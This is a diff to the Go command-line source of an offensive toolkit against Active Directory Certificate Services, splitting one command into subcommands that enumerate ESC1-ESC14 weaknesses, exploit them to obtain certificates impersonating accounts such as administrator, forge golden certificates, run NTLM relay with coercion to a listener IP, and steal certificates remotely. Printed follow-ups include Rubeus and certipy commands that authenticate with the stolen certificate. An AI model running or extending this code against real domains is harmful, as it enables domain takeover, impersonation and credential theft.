@@ -10,7 +10,6 @@ import (
 	"encoding/pem"
 	"fmt"
 	"os"
-	"os/exec"
 	"strings"
 	"time"
 
@@ -18,129 +17,137 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var pkiCmd = &cobra.Command{
-	Use:   "pki",
-	Short: "Advanced Certificate/PKI attack toolkit",
-	Long: `ADCS enumeration (ESC1-ESC14), golden certificate forging, ESC exploitation, PFX import, and engagement reporting.
+// esc <n> — exploit ESC vulnerabilities 1-14
+var escCmd = &cobra.Command{
+	Use:   "esc <n>",
+	Short: "Exploit ESC vulnerability (1-14)",
+	Long: `Exploit ADCS ESC vulnerabilities: certificate enrollment, relay attacks, ACL abuse, and more.
 
 Examples:
-  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --ldaps
-  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --json
-  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user -p pass --stealth
-  trusted pki --enum --target-dc dc01.corp.local --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
-  trusted pki --esc 1 --template VulnTemplate --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  trusted pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  trusted pki --esc 8 --template Machine --target-dc dc01.corp.local --domain corp.local -u user -p pass --listener-ip 10.0.0.5
-  trusted pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
-  trusted pki --report --format markdown --output findings.md --target-dc dc01.corp.local --domain corp.local -u user -p pass
-  trusted pki --theft all
-  trusted pki --import-pfx cert.pfx`,
+  trusted esc 1 -t Vuln -U admin@corp.local -d corp.local -dc dc01
+  ted esc 7 -ca CorpCA -U admin@corp.local
+  ted esc 8 -t Machine -l 10.0.0.5 -d corp.local -dc dc01
+  ted esc 11 -t Machine -U admin@corp.local -l 10.0.0.5`,
+	Args: cobra.ExactArgs(1),
 	RunE: func(cmd *cobra.Command, args []string) error {
-		doEnum, _ := cmd.Flags().GetBool("enum")
-		doForge, _ := cmd.Flags().GetBool("forge")
-		exploit, _ := cmd.Flags().GetString("esc")
-		if exploit == "" {
-			exploit, _ = cmd.Flags().GetString("exploit") // legacy
-		}
-		doAutoDetect, _ := cmd.Flags().GetBool("auto-detect")
-		importPFX, _ := cmd.Flags().GetString("import-pfx")
-		doReport, _ := cmd.Flags().GetBool("report")
-		certTheft, _ := cmd.Flags().GetString("theft")
-		if certTheft == "" {
-			certTheft, _ = cmd.Flags().GetString("cert-theft") // legacy
-		}
-
-		// Count how many actions are requested
-		actionCount := 0
-		if doEnum {
-			actionCount++
-		}
-		if doForge {
-			actionCount++
-		}
-		if exploit != "" {
-			actionCount++
-		}
-		if doAutoDetect {
-			actionCount++
-		}
-		if importPFX != "" {
-			actionCount++
-		}
-		if doReport {
-			actionCount++
-		}
-		if certTheft != "" {
-			cfg := buildADCSConfig(cmd)
-			if cfg.TargetDC == "" || cfg.Domain == "" {
-				return fmt.Errorf("--target-dc and --domain are required for certificate extraction")
-			}
-			if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
-				return fmt.Errorf("Authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
-			}
-
-			// If theft4 or just 4, run LDAP extraction. Otherwise run SMBExec remote theft.
-			if strings.EqualFold(certTheft, "theft4") || certTheft == "4" {
-				outputDir, _ := cmd.Flags().GetString("output")
-				if outputDir == "" {
-					outputDir = "ldap_certs"
-				}
-				certs, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
-				if cfg.OutputJSON {
-					if err != nil {
-						data, _ := json.MarshalIndent(map[string]string{"error": err.Error()}, "", "  ")
-						fmt.Println(string(data))
-						return nil
-					}
-					data, _ := json.MarshalIndent(certs, "", "  ")
-					fmt.Println(string(data))
-					return nil
-				}
-				return err
-			} else {
-				// Normalize theftX or X to theftX
-				method := certTheft
-				if len(method) <= 2 && method[0] >= '0' && method[0] <= '9' {
-					method = "theft" + method
-				}
-				err := pki.RemoteCertTheft(cfg.TargetDC, method, cfg)
-				if cfg.OutputJSON {
-					status := "success"
-					if err != nil {
-						status = err.Error()
-					}
-					data, _ := json.MarshalIndent(map[string]string{"method": method, "status": status}, "", "  ")
-					fmt.Println(string(data))
-					return nil
-				}
-				return err
-			}
-		}
-		if importPFX != "" {
-			return runImportPFX(cmd, importPFX)
-		}
-		if doReport {
-			return runReport(cmd)
-		}
-		if doAutoDetect {
-			return runAutoDetect(cmd)
-		}
-		if exploit != "" {
-			return runExploit(cmd, exploit)
-		}
-		if doEnum {
-			return runEnumerate(cmd)
-		}
-		if doForge {
-			return runForge(cmd)
-		}
-		return nil
+		return runExploit(cmd, args[0])
 	},
 }
 
+// enum — enumerate ADCS certificate templates
+var enumCmd = &cobra.Command{
+	Use:   "enum",
+	Short: "Enumerate ADCS certificate templates and ESC vulnerabilities",
+	Long: `Enumerate all certificate templates, CA objects, and scan for ESC1-ESC14 vulnerabilities.
+
+Examples:
+  trusted enum -d corp.local -dc dc01 -u user -p pass
+  ted enum -d corp.local -dc dc01 -u user -H <hash> -L
+  ted enum -d corp.local -dc dc01 -u user -p pass -j -s`,
+	Args: cobra.NoArgs,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runEnumerate(cmd)
+	},
+}
+
+// forge — forge golden certificates
+var forgeCmd = &cobra.Command{
+	Use:   "forge",
+	Short: "Forge golden certificate (self-signed or CA-signed)",
+	Long: `Forge a golden certificate. Self-signed by default, or CA-signed with --ca-key and --ca-cert.
+
+Examples:
+  trusted forge -U admin@corp.local
+  ted forge -U admin@corp.local --ca-key ca.key --ca-cert ca.crt -o admin`,
+	Args: cobra.NoArgs,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runForge(cmd)
+	},
+}
+
+// import <file> — inspect a PKCS12/PFX file
+var importCmd = &cobra.Command{
+	Use:   "import <pfx-file>",
+	Short: "Import and inspect a PKCS12/PFX certificate file",
+	Args:  cobra.ExactArgs(1),
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runImportPFX(cmd, args[0])
+	},
+}
+
+// report — generate ADCS engagement report
+var reportCmd = &cobra.Command{
+	Use:   "report",
+	Short: "Generate engagement report from full ADCS enumeration",
+	Long: `Run a full ADCS enumeration and generate a markdown engagement report.
+
+Examples:
+  trusted report -d corp.local -dc dc01 -u user -p pass -o findings.md`,
+	Args: cobra.NoArgs,
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runReport(cmd)
+	},
+}
+
+// theft <n> — certificate theft playbook
+var theftCmd = &cobra.Command{
+	Use:   "theft <n>",
+	Short: "Certificate theft playbook (1-5, all, theft4)",
+	Long: `Certificate theft guidance and automated extraction (THEFT4).
+
+Examples:
+  trusted theft all
+  ted theft 4 -d corp.local -dc dc01 -u user -p pass -o certs_out`,
+	Args: cobra.ExactArgs(1),
+	RunE: func(cmd *cobra.Command, args []string) error {
+		return runTheft(cmd, args[0])
+	},
+}
+
+func init() {
+	rootCmd.AddCommand(escCmd)
+	rootCmd.AddCommand(enumCmd)
+	rootCmd.AddCommand(forgeCmd)
+	rootCmd.AddCommand(importCmd)
+	rootCmd.AddCommand(reportCmd)
+	rootCmd.AddCommand(theftCmd)
+
+	// esc flags
+	escCmd.Flags().StringP("template", "t", "", "Certificate template name")
+	escCmd.Flags().StringP("upn", "U", "", "Target UPN to impersonate")
+	escCmd.Flags().StringP("ca", "c", "", "Target CA name (ESC5/7)")
+	escCmd.Flags().StringP("adn", "", "", "Attacker DN (ESC9/10)")
+	escCmd.Flags().StringP("vdn", "", "", "Victim DN (ESC14)")
+	escCmd.Flags().StringP("lip", "l", "", "Listener IP for relay (ESC8/11/12)")
+	escCmd.Flags().IntP("lp", "", 0, "Listener port for coercion (>1024 = WebDAV)")
+	escCmd.Flags().IntP("rp", "", 8080, "Relay port for NTLM relay")
+	escCmd.Flags().IntP("rt", "", 120, "Relay timeout (seconds)")
+	escCmd.Flags().StringP("output", "o", "", "Output file path for certificate")
+	escCmd.Flags().StringP("pfx-password", "P", "", "PFX password")
+
+	// forge flags
+	forgeCmd.Flags().StringP("upn", "U", "", "UPN to embed (required)")
+	forgeCmd.Flags().String("ca-key", "", "CA private key PEM (golden cert mode)")
+	forgeCmd.Flags().String("ca-cert", "", "CA certificate PEM (golden cert mode)")
+	forgeCmd.Flags().StringP("output", "o", "", "Output path prefix")
+	forgeCmd.Flags().StringP("pfx-password", "P", "", "PFX password")
+
+	// theft flags
+	theftCmd.Flags().StringP("output", "o", "", "Output directory (THEFT4)")
+
+	// enum flags
+	enumCmd.Flags().StringP("output", "o", "", "Output path (unused, JSON goes to stdout)")
+
+	// report flags
+	reportCmd.Flags().StringP("output", "o", "", "Output file path (default: findings.md)")
+	reportCmd.Flags().String("format", "markdown", "Report format (markdown)")
+
+	// import flags
+	importCmd.Flags().StringP("pfx-password", "P", "", "PFX password")
+}
+
 func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
-	targetDC, _ := cmd.Flags().GetString("target-dc")
+	targetDC, _ := cmd.Flags().GetString("dc")
 	domain, _ := cmd.Flags().GetString("domain")
 	username, _ := cmd.Flags().GetString("username")
 	password, _ := cmd.Flags().GetString("password")
@@ -176,10 +183,10 @@ func buildADCSConfig(cmd *cobra.Command) *pki.ADCSConfig {
 func runEnumerate(cmd *cobra.Command) error {
 	cfg := buildADCSConfig(cmd)
 	if cfg.TargetDC == "" || cfg.Domain == "" {
-		return fmt.Errorf("--target-dc and --domain are required for enumeration")
+		return fmt.Errorf("-dc and -d are required for enumeration")
 	}
 	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
-		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
+		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
 	}
 	ctx := context.Background()
 	conn, err := pki.ConnectLDAP(ctx, cfg)
@@ -188,7 +195,6 @@ func runEnumerate(cmd *cobra.Command) error {
 	}
 	defer conn.Close()
 
-	// JSON mode: use EnumerateAll for structured output
 	if cfg.OutputJSON {
 		result, err := pki.EnumerateAll(ctx, cfg, conn)
 		if err != nil {
@@ -228,7 +234,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC2: Any Purpose EKU templates
 	fmt.Println("\n[*] Scanning for ESC2 (Any Purpose EKU templates)...")
 	esc2Findings, err := pki.ScanESC2(ctx, cfg, conn)
 	if err != nil {
@@ -244,7 +249,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC3: Enrollment Agent templates
 	fmt.Println("\n[*] Scanning for ESC3 (Enrollment Agent templates)...")
 	esc3Findings, err := pki.ScanESC3(ctx, cfg, conn)
 	if err != nil {
@@ -260,7 +264,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC5: CA object ACL inspection via nTSecurityDescriptor parsing
 	fmt.Println("\n[*] Scanning CA objects for ESC5 (dangerous ACLs on CA itself)...")
 	esc5Findings, err := pki.ScanESC5(ctx, cfg, conn)
 	if err != nil {
@@ -278,7 +281,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 on enrollment service
 	fmt.Println("\n[*] Scanning for ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2 on CA)...")
 	esc6Findings, err := pki.ScanESC6(ctx, cfg, conn)
 	if err != nil {
@@ -294,12 +296,11 @@ func runEnumerate(cmd *cobra.Command) error {
 			if len(f.Templates) > 0 {
 				fmt.Printf("    Templates: %s\n", strings.Join(f.Templates, ", "))
 			}
-			fmt.Printf("    > trusted pki --esc 6 --template <ANY> --upn <UPN>\n")
+			fmt.Printf("    > trusted esc 6 -t <ANY> -U <UPN>\n")
 			fmt.Println()
 		}
 	}
 
-	// ESC7: Vulnerable CA ACLs (ManageCA / ManageCertificates)
 	fmt.Println("\n[*] Scanning for ESC7 (vulnerable CA ACLs)...")
 	esc7Findings, err := pki.ScanESC7(ctx, cfg, conn)
 	if err != nil {
@@ -314,12 +315,11 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    ManageCA:            %v\n", f.ManageCA)
 			fmt.Printf("    ManageCertificates:  %v\n", f.ManageCertificates)
 			fmt.Printf("    Access Mask:         0x%08x\n", f.AccessMask)
-			fmt.Printf("    > trusted pki --esc 7 --ca %q --upn <UPN>\n", f.CAName)
+			fmt.Printf("    > trusted esc 7 -ca %q -U <UPN>\n", f.CAName)
 			fmt.Println()
 		}
 	}
 
-	// ESC8: NTLM relay to AD CS web enrollment
 	fmt.Println("\n[*] Scanning for ESC8 (NTLM relay to web enrollment)...")
 	esc8Findings, err := pki.ScanESC8(ctx, cfg, conn)
 	if err != nil {
@@ -339,7 +339,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC11: NTLM relay to AD CS RPC interface
 	fmt.Println("\n[*] Scanning for ESC11 (NTLM relay to RPC interface)...")
 	esc11Findings, err := pki.ScanESC11(ctx, cfg, conn)
 	if err != nil {
@@ -353,12 +352,11 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
 			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
 			fmt.Printf("    Encrypts:  %v\n", f.EnforcesEncryption)
-			fmt.Printf("    > certipy-ad relay -target rpc://%s -ca %q\n", f.CAHostname, f.CAName)
+			fmt.Printf("    > trusted esc 11 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s\n", f.CAHostname)
 			fmt.Println()
 		}
 	}
 
-	// ESC12: DCOM interface abuse on CA with network HSM key storage
 	fmt.Println("\n[*] Scanning for ESC12 (DCOM interface abuse on CA)...")
 	esc12Findings, err := pki.ScanESC12(ctx, cfg, conn)
 	if err != nil {
@@ -372,13 +370,11 @@ func runEnumerate(cmd *cobra.Command) error {
 			fmt.Printf("    Hostname:  %s\n", f.CAHostname)
 			fmt.Printf("    DCOM:      %v\n", f.DCOMAccessible)
 			fmt.Printf("    Flags:     0x%08x\n", f.Flags)
-			fmt.Printf("    > certipy-ad relay -target dcom://%s -ca %q\n", f.CAHostname, f.CAName)
-			fmt.Printf("               # Or: impacket-ntlmrelayx -t dcom://%s --adcs -smb2support\n", f.CAHostname)
+			fmt.Printf("    > trusted esc 12 -t <TEMPLATE> -U <UPN> -l <IP> -dc %s\n", f.CAHostname)
 			fmt.Println()
 		}
 	}
 
-	// ESC9: CT_FLAG_NO_SECURITY_EXTENSION — UPN spoofing via missing requester SID
 	fmt.Println("\n[*] Scanning for ESC9 (CT_FLAG_NO_SECURITY_EXTENSION)...")
 	esc9Findings, err := pki.ScanESC9(ctx, cfg, conn)
 	if err != nil {
@@ -405,7 +401,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC10: Weak certificate mapping methods
 	fmt.Println("\n[*] Scanning for ESC10 (weak certificate mapping methods)...")
 	esc10Findings, err := pki.ScanESC10(ctx, cfg, conn)
 	if err != nil {
@@ -433,7 +428,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC13: OID group link abuse via msDS-OIDToGroupLink
 	fmt.Println("\n[*] Scanning for ESC13 (OID group link abuse)...")
 	esc13Findings, err := pki.ScanESC13(ctx, cfg, conn)
 	if err != nil {
@@ -450,7 +444,6 @@ func runEnumerate(cmd *cobra.Command) error {
 		}
 	}
 
-	// ESC14: Weak explicit mappings via altSecurityIdentities
 	fmt.Println("\n[*] Scanning for ESC14 (weak explicit mappings via altSecurityIdentities)...")
 	esc14Findings, err := pki.ScanESC14(ctx, cfg, conn)
 	if err != nil {
@@ -488,13 +481,12 @@ func runForge(cmd *cobra.Command) error {
 	output, _ := cmd.Flags().GetString("output")
 
 	if upn == "" {
-		return fmt.Errorf("--upn is required for certificate forging (e.g. --upn administrator@corp.local)")
+		return fmt.Errorf("-U is required for certificate forging (e.g. -U administrator@corp.local)")
 	}
 	if !strings.Contains(upn, "@") {
-		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q", upn)
+		return fmt.Errorf("-U must be a full UPN (user@domain), got %q", upn)
 	}
 	if output == "" {
-		// Default to UPN username (e.g., administrator@corp.local → administrator)
 		if idx := strings.Index(upn, "@"); idx > 0 {
 			output = upn[:idx]
 		} else {
@@ -508,7 +500,6 @@ func runForge(cmd *cobra.Command) error {
 	}
 
 	// Golden Certificate mode: both --ca-key and --ca-cert provided
-	// Uses ForgeGoldenCertificate to sign with real CA key and chain to real CA cert
 	if caKeyPath != "" && caCertPath != "" {
 		fmt.Println("[!] Golden Certificate mode: signing with real CA key + cert")
 		caCert, caKey, err := pki.LoadCACertAndKey(caCertPath, caKeyPath)
@@ -526,7 +517,7 @@ func runForge(cmd *cobra.Command) error {
 		}
 		pfxPassword, _ := cmd.Flags().GetString("pfx-password")
 		if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
-			fmt.Printf("[!] PFX export failed: %v\n", err)
+			return fmt.Errorf("PFX export failed: %w", err)
 		}
 
 		outputJSON, _ := cmd.Flags().GetBool("json")
@@ -553,7 +544,7 @@ func runForge(cmd *cobra.Command) error {
 		return nil
 	}
 
-	// Self-signed mode: original ForgeCertificate behavior
+	// Self-signed mode
 	var caKey crypto.PrivateKey
 
 	if caKeyPath != "" {
@@ -565,17 +556,14 @@ func runForge(cmd *cobra.Command) error {
 		if block == nil {
 			return fmt.Errorf("no PEM block found in %s", caKeyPath)
 		}
-		// Try PKCS8 first (handles RSA, ECDSA, Ed25519), then legacy formats
 		pkcs8Key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
 		if err == nil {
 			caKey = pkcs8Key
 		} else {
-			// Try PKCS1 RSA
 			rsaKey, rsaErr := x509.ParsePKCS1PrivateKey(block.Bytes)
 			if rsaErr == nil {
 				caKey = rsaKey
 			} else {
-				// Try EC
 				ecKey, ecErr := x509.ParseECPrivateKey(block.Bytes)
 				if ecErr != nil {
 					return fmt.Errorf("parse CA key: PKCS8: %v, PKCS1: %v, EC: %v", err, rsaErr, ecErr)
@@ -602,7 +590,7 @@ func runForge(cmd *cobra.Command) error {
 	}
 	pfxPassword, _ := cmd.Flags().GetString("pfx-password")
 	if err := pki.WritePFX(cert, certKey, basePath+".pfx", pfxPassword); err != nil {
-		fmt.Printf("[!] PFX export failed: %v\n", err)
+		return fmt.Errorf("PFX export failed: %w", err)
 	}
 
 	outputJSON, _ := cmd.Flags().GetBool("json")
@@ -627,13 +615,58 @@ func runForge(cmd *cobra.Command) error {
 	return nil
 }
 
+func runTheft(cmd *cobra.Command, certTheft string) error {
+	cfg := buildADCSConfig(cmd)
+	if cfg.TargetDC == "" || cfg.Domain == "" {
+		return fmt.Errorf("-dc and -d are required for certificate extraction")
+	}
+	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
+		return fmt.Errorf("Authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
+	}
+
+	if strings.EqualFold(certTheft, "theft4") || certTheft == "4" {
+		outputDir, _ := cmd.Flags().GetString("output")
+		if outputDir == "" {
+			outputDir = "ldap_certs"
+		}
+		certs, err := pki.ExtractUserCertificatesLDAP(cfg, outputDir)
+		if cfg.OutputJSON {
+			if err != nil {
+				data, _ := json.MarshalIndent(map[string]string{"error": err.Error()}, "", "  ")
+				fmt.Println(string(data))
+				return nil
+			}
+			data, _ := json.MarshalIndent(certs, "", "  ")
+			fmt.Println(string(data))
+			return nil
+		}
+		return err
+	}
+
+	method := certTheft
+	if len(method) <= 2 && method[0] >= '0' && method[0] <= '9' {
+		method = "theft" + method
+	}
+	err := pki.RemoteCertTheft(cfg.TargetDC, method, cfg)
+	if cfg.OutputJSON {
+		status := "success"
+		if err != nil {
+			status = err.Error()
+		}
+		data, _ := json.MarshalIndent(map[string]string{"method": method, "status": status}, "", "  ")
+		fmt.Println(string(data))
+		return nil
+	}
+	return err
+}
+
 func runExploit(cmd *cobra.Command, exploit string) error {
 	cfg := buildADCSConfig(cmd)
 	if cfg.TargetDC == "" || cfg.Domain == "" {
-		return fmt.Errorf("--target-dc and --domain are required")
+		return fmt.Errorf("-dc and -d are required")
 	}
 	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
-		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
+		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or -H <NT_HASH> or -k for Kerberos)")
 	}
 	ctx := context.Background()
 	conn, err := pki.ConnectLDAP(ctx, cfg)
@@ -646,21 +679,21 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	upn, _ := cmd.Flags().GetString("upn")
 	output, _ := cmd.Flags().GetString("output")
 
-	// ESC5/8/10/11/12/14 are scan-only — they don't require --template or --upn
 	escID := strings.ToLower(strings.TrimPrefix(strings.ToLower(exploit), "esc"))
-	isScanOnly := escID == "5" || escID == "8" || escID == "10" || escID == "11" || escID == "12" || escID == "14"
+	isRelayESC := escID == "8" || escID == "11" || escID == "12"
+	needsTemplate := escID != "5" && !isRelayESC
+	needsUPN := !isRelayESC
 
-	if templateName == "" && !isScanOnly {
-		return fmt.Errorf("--template is required for exploitation (e.g. --template User)")
+	if templateName == "" && needsTemplate {
+		return fmt.Errorf("-t (template) is required for exploitation")
 	}
-	if upn == "" && !isScanOnly {
-		return fmt.Errorf("--upn is required for exploitation (e.g. --upn administrator@%s)", cfg.Domain)
+	if upn == "" && needsUPN {
+		return fmt.Errorf("-U (UPN) is required for exploitation")
 	}
 	if upn != "" && !strings.Contains(upn, "@") {
-		return fmt.Errorf("--upn must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, cfg.Domain)
+		return fmt.Errorf("-U must be a full UPN (user@domain), got %q — try %s@%s", upn, upn, cfg.Domain)
 	}
 	if output == "" {
-		// Default to UPN username (e.g., administrator@corp.local → administrator)
 		if idx := strings.Index(upn, "@"); idx > 0 {
 			output = upn[:idx]
 		} else {
@@ -685,13 +718,13 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	case "7":
 		caName, _ := cmd.Flags().GetString("ca")
 		if caName == "" {
-			return fmt.Errorf("--ca is required for ESC7 exploitation (target CA name)")
+			return fmt.Errorf("-ca is required for ESC7 exploitation")
 		}
 		cert, certKey, err = pki.ExploitESC7(ctx, cfg, conn, caName, upn)
 	case "9":
-		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
+		attackerDN, _ := cmd.Flags().GetString("adn")
 		if attackerDN == "" {
-			return fmt.Errorf("--attacker-dn is required for ESC9 exploitation (attacker's LDAP DN)")
+			return fmt.Errorf("--adn is required for ESC9 exploitation")
 		}
 		cert, certKey, err = pki.ExploitESC9(ctx, cfg, conn, templateName, attackerDN, upn)
 	case "13":
@@ -710,11 +743,11 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			return nil
 		}
 		target := esc8Findings[0]
-		relayPort, _ := cmd.Flags().GetInt("relay-port")
+		relayPort, _ := cmd.Flags().GetInt("rp")
 		if relayPort == 0 {
 			relayPort = 8080
 		}
-		relayTimeout, _ := cmd.Flags().GetInt("relay-timeout")
+		relayTimeout, _ := cmd.Flags().GetInt("rt")
 		if relayTimeout == 0 {
 			relayTimeout = 120
 		}
@@ -723,8 +756,8 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		fmt.Printf("[*] Template: %s\n", templateName)
 		fmt.Printf("[*] Timeout: %ds — waiting for coerced NTLM authentication\n\n", relayTimeout)
 
-		listenerIP, _ := cmd.Flags().GetString("listener-ip")
-		listenerPort, _ := cmd.Flags().GetInt("listener-port")
+		listenerIP, _ := cmd.Flags().GetString("lip")
+		listenerPort, _ := cmd.Flags().GetInt("lp")
 		if listenerIP != "" {
 			go func() {
 				time.Sleep(2 * time.Second)
@@ -765,28 +798,30 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 			return nil
 		}
 		f := esc12Findings[0]
-		
-		listenerIP, _ := cmd.Flags().GetString("listener-ip")
-		listenerPort, _ := cmd.Flags().GetInt("listener-port")
-		if listenerIP == "" {
-			return fmt.Errorf("--listener-ip is required for automated coercion")
-		}
 
-		targetURL := fmt.Sprintf("dcom://%s", f.CAHostname)
-		if err := runAutomatedRelay(cfg, targetURL, f.CAName, templateName, listenerIP, listenerPort); err != nil {
-			return err
+		listenerIP, _ := cmd.Flags().GetString("lip")
+		listenerPort, _ := cmd.Flags().GetInt("lp")
+		if listenerIP == "" {
+			return fmt.Errorf("-l (listener IP) is required for automated coercion")
 		}
-		return nil
+		relayPort, _ := cmd.Flags().GetInt("rp")
+		relayTimeout, _ := cmd.Flags().GetInt("rt")
+
+		relayCert, relayKey, relayErr := runAutomatedRelay(cfg, f.CAHostname, f.CAName, templateName, upn, listenerIP, listenerPort, relayPort, time.Duration(relayTimeout)*time.Second)
+		if relayErr != nil {
+			return relayErr
+		}
+		cert, certKey = relayCert, relayKey
 	case "5":
 		caName, _ := cmd.Flags().GetString("ca")
 		if caName == "" {
-			return fmt.Errorf("--ca is required for ESC5 exploitation (target CA name)")
+			return fmt.Errorf("-ca is required for ESC5 exploitation")
 		}
 		cert, certKey, err = pki.ExploitESC5(ctx, cfg, conn, caName, upn)
 	case "10":
-		attackerDN, _ := cmd.Flags().GetString("attacker-dn")
+		attackerDN, _ := cmd.Flags().GetString("adn")
 		if attackerDN == "" {
-			return fmt.Errorf("--attacker-dn is required for ESC10 exploitation")
+			return fmt.Errorf("--adn is required for ESC10 exploitation")
 		}
 		cert, certKey, err = pki.ExploitESC10(ctx, cfg, conn, templateName, attackerDN, upn)
 	case "11":
@@ -804,21 +839,23 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		}
 		f := esc11Findings[0]
 
-		listenerIP, _ := cmd.Flags().GetString("listener-ip")
-		listenerPort, _ := cmd.Flags().GetInt("listener-port")
+		listenerIP, _ := cmd.Flags().GetString("lip")
+		listenerPort, _ := cmd.Flags().GetInt("lp")
 		if listenerIP == "" {
-			return fmt.Errorf("--listener-ip is required for automated coercion")
+			return fmt.Errorf("-l (listener IP) is required for automated coercion")
 		}
+		relayPort, _ := cmd.Flags().GetInt("rp")
+		relayTimeout, _ := cmd.Flags().GetInt("rt")
 
-		targetURL := fmt.Sprintf("rpc://%s", f.CAHostname)
-		if err := runAutomatedRelay(cfg, targetURL, f.CAName, templateName, listenerIP, listenerPort); err != nil {
-			return err
+		relayCert, relayKey, relayErr := runAutomatedRelay(cfg, f.CAHostname, f.CAName, templateName, upn, listenerIP, listenerPort, relayPort, time.Duration(relayTimeout)*time.Second)
+		if relayErr != nil {
+			return relayErr
 		}
-		return nil
+		cert, certKey = relayCert, relayKey
 	case "14":
-		victimDN, _ := cmd.Flags().GetString("victim-dn")
+		victimDN, _ := cmd.Flags().GetString("vdn")
 		if victimDN == "" {
-			return fmt.Errorf("--victim-dn is required for ESC14 exploitation")
+			return fmt.Errorf("--vdn is required for ESC14 exploitation")
 		}
 		cert, certKey, err = pki.ExploitESC14(ctx, cfg, conn, templateName, victimDN)
 	default:
@@ -835,14 +872,12 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		basePath = strings.TrimSuffix(basePath, ext)
 	}
 
-	// Always write PEM files
 	if err := pki.WriteCertKeyPEM(cert, certKey, basePath); err != nil {
 		return fmt.Errorf("write cert: %w", err)
 	}
-	// Also write PFX for direct certipy/Rubeus use
 	pfxPath := basePath + ".pfx"
 	if err := pki.WritePFX(cert, certKey, pfxPath, pfxPassword); err != nil {
-		fmt.Printf("[!] PFX export failed: %v\n", err)
+		return fmt.Errorf("PFX export failed: %w", err)
 	}
 
 	if cfg.OutputJSON {
@@ -863,7 +898,6 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 		return nil
 	}
 
-	// Detect whether we got a CA-signed cert or fell back to self-signed
 	selfSigned := cert.Issuer.CommonName == cert.Subject.CommonName
 
 	if selfSigned {
@@ -879,63 +913,17 @@ func runExploit(cmd *cobra.Command, exploit string) error {
 	fmt.Printf("    Issuer:   %s\n", cert.Issuer.CommonName)
 	fmt.Printf("    Files:    %s.crt / %s.key / %s.pfx\n", basePath, basePath, basePath)
 	if !selfSigned {
-		fmt.Printf("\n[*] Authenticate with the certificate:\n")
-		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n", pfxPath, cfg.Domain)
 		sam := upn
 		if idx := strings.Index(sam, "@"); idx > 0 {
 			sam = sam[:idx]
 		}
+		fmt.Printf("\n[*] Authenticate with the certificate:\n")
 		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt", sam, pfxPath)
 		if pfxPassword != "" {
 			rubeusCmd += fmt.Sprintf(" /password:%s", pfxPassword)
 		}
 		fmt.Printf("    %s\n", rubeusCmd)
-	}
-	return nil
-}
-
-func runAutoDetect(cmd *cobra.Command) error {
-	cfg := buildADCSConfig(cmd)
-	if cfg.TargetDC == "" || cfg.Domain == "" {
-		return fmt.Errorf("--target-dc and --domain are required")
-	}
-	if !cfg.Kerberos && (cfg.Username == "" || (cfg.Password == "" && cfg.Hash == "")) {
-		return fmt.Errorf("LDAP authentication required: use -u <user> -p <pass> (or --hash <NT_HASH> or -k for Kerberos)")
-	}
-	ctx := context.Background()
-	conn, err := pki.ConnectLDAP(ctx, cfg)
-	if err != nil {
